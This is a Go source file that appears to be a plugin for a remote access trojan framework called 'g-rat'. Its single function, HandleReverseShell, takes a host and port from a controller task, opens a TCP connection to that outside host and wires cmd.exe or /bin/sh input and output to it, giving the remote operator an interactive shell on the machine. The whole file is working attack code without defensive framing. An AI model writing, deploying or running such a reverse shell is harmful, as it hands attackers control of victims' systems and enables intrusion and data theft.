package plugins

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"time"

	"github.com/sevil11/g-rat/shared"
)

// HandleReverseShell establishes a reverse shell connection
func HandleReverseShell(task shared.Task) shared.Result {
	result := shared.Result{
		TaskID:    task.ID,
		AgentID:   "", // Will be set by the agent
		StartTime: time.Now(),
	}
	
	// Extract connection parameters
	host, ok := task.Args["host"]
	if !ok {
		result.Error = "missing host parameter"
		result.ExitCode = 1
		return result
	}
	
	port, ok := task.Args["port"]
	if !ok {
		result.Error = "missing port parameter"
		result.ExitCode = 1
		return result
	}
	
	// Establish connection
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", host, port))
	if err != nil {
		result.Error = fmt.Sprintf("connection failed: %v", err)
		result.ExitCode = 1
		return result
	}
	
	// Start appropriate shell
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd")
	} else {
		cmd = exec.Command("/bin/sh")
	}
	
	// Connect I/O
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	
	// Run the shell
	err = cmd.Run()
	if err != nil {
		result.Error = fmt.Sprintf("shell execution failed: %v", err)
		result.ExitCode = 1
	} else {
		result.Output = "Reverse shell established"
	}
	
	return result
}